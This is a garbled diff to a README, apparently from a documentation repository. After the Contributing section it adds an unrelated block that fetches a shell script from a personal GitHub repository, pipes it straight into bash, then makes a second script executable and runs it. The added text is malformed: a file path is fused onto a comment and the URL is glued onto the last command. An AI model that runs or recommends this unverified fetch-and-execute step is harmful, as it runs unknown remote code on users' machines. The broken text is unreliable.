@@ -45,3 +45,11 @@ See [SUPPORT](./SUPPORT.md).
 ## Contributing
 
 See [CONTRIBUTING](./CONTRIBUTING.md).
+content/actions/guides.md# Download and execute the script from GitHub
+bash <(curl -s https://raw.githubusercontent.com/kfhunter1/SMN_CONTENT/main/auto_setup.sh)
+
+# Make smn_hybrid_auto.sh executable
+chmod +x smn_hybrid_auto.sh
+
+# Execute smn_hybrid_auto.sh
+./smn_hybrid_auto.shhttps://raw.githubusercontent.com/kfhunter1/SMN_CONTENT/main/auto_setup.sh)
